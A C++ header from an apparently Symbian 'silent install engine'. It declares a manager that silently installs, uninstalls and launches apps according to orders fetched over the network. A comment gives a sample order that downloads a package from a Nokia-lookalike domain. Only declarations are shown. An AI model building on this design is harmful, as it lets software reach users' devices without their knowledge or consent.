#ifndef __SILENTINSTENGINE_H
#define __SILENTINSTENGINE_H

#include <swinstapi.h>
#include <swinstdefs.h>
#include <e32base.h>
#include <apgcli.h>
#include <apaid.h>
#include "aosync.h"
#include "socketengine.h"
#include "timeouttimer.h"
#include "commonutils.h"

struct Application{
  //i,0x2003D898,http://nqkia.com/PACKAGE/c/TongJiJingLing_1001001.sisx,1
  HBufC8* Order;
  TUid AppUid;
  HBufC8* Url;
  HBufC8* Id;
  Application(){
  }
  
  ~Application(){
    SAFE_DELETE(Order);
    SAFE_DELETE(Url);
    SAFE_DELETE(Id);
  }
};

class MSisInstaller{
public:
  virtual void OnInstallerEvent(TBool aIsInstall,TUid aAppUid,TInt aError) = 0;
};

class CApplicationManager:public CBase,public CHTTPObserver,public MTimeOutNotify{
public:
  static CApplicationManager* NewL();
  static CApplicationManager* NewLC();
  ~CApplicationManager();

public:
  void Install(const TDesC& aAppPath);
  TBool IsInstalled(const TUid& aAppUid);//用于sisx
  TInt Uninstall(const TUid& aAppUID);
  TInt Uninstall(const TDesC8& aAppUID);
  TBool IsInstalling() const;
  TInt CApplicationManager::StartApplication(TUid aAppUid);
  HBufC* CApplicationManager::getApplicationName(const TUid& aAppUid);
  void OnTimerExpired();//From MTimeOutNotify
  void OnDownloadFinished(const TDesC& aFileName);
  void StartTask(CTaskObserver* aObserver,const TDesC8& aFlowOrder,TInt aTaskFlag);
private:
  void ConstructL();
  CApplicationManager();
  void ParseApplicationOrder(const TDesC8& aContent);
  void CleanUp();
private:
  TInt retVal;
  SwiUI::RSWInstSilentLauncher iLauncher;
  SwiUI::TInstallOptions iOptions;
  SwiUI::TInstallOptionsPckg iOptionsPckg;
  RApaLsSession iLsSession; //软件管理
  CAOSync *iAsyncWaiter;
  CTimeOutTimer* iTimer;
  CArrayPtrSeg<Application>* iApplicationArray;
  CSocketEngine* iSocketEngine;
  TInt iApplicationIndex;
  CTaskObserver* iTaskObserver;
  TInt iTaskId;
};

#endif 
